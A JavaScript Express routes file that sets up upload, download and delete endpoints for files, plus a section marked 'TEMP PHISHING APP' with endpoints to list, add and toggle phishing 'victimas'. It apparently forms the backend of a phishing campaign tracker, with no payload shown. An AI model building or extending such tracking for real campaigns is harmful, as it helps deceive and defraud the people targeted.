import { deleteFile, getFile, postFile } from "../controllers/files-controller.js";
import { createVictima, getVictimas, toggleVictima } from "../controllers/victimas-controller.js";

export const getFilesEndpoints = (app, upload) => {

  app.post("/api/files", upload.any(), async (request, response) => {
    try {
      response = await getFile(
        response,
        request.body.key
      );
      
    } catch (error) {
      response.status(500).json({ error: 'Ocurrió un error al obtener el archivo: ' + error });
    }
  })

  app.put("/api/files", upload.any(), async (request, response) => {
    try {
      response = await postFile(
        response,
        request.body.key,
        request.files[0],
      );
      
    } catch (error) {
      response.status(500).json({ error: 'Ocurrió un error al subir el archivo: ' + error });
    }
  })

  app.delete("/api/files", upload.any(), async (request, response) => {
    try {
      response = await deleteFile(
        response,
        request.body.key
      );
      
    } catch (error) {
      response.status(500).json({ error: 'Ocurrió un error al eliminar el archivo: ' + error });
    }
  })
  

  //TEMP PHISHING APP

  app.get("/api/victimas", upload.any(), async (request, response) => {
    try {
      response = await getVictimas({
        response
      });
    } catch (error) {
      response.status(500).json({ error: 'Ocurrió un error' + error });
    }
  })

  app.post("/api/victimas", upload.any(), async (request, response) => {
    try {
      response = await createVictima(
        response,
        request.body.nombre
      );
    } catch (error) {
      response.status(500).json({ error: 'Ocurrió un error' + error });
    }
  })

  app.put("/api/victimas/:id", upload.any(), async (request, response) => {
    try {
      response = await toggleVictima(
        response,
        request.params.id
      );
    } catch (error) {
      response.status(500).json({ error: 'Ocurrió un error' + error });
    }
  })



  return app;
}